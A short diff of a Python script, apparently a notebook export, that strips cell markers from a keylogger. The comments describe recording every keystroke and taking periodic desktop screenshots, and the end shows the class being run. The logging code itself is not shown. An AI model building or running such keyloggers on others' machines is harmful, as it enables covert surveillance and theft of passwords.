@@ -1,9 +1,6 @@
 #!/usr/bin/env python
 # coding: utf-8
 
-# In[ ]:
-
-
 #This keylogger can do two things ("Keep record of all the keys pressed and can also take Screenshot of the Desktop after a certain interval of time")
 
 #Import all these Libraries
@@ -73,10 +70,5 @@ class keylogger_main:
 km=keylogger_main() 
 interval=int(input("Enter the time interval which you want to be there in between each Screenshot:"))
 km.run(interval)
-
-
-# In[ ]:
-
-
 
 
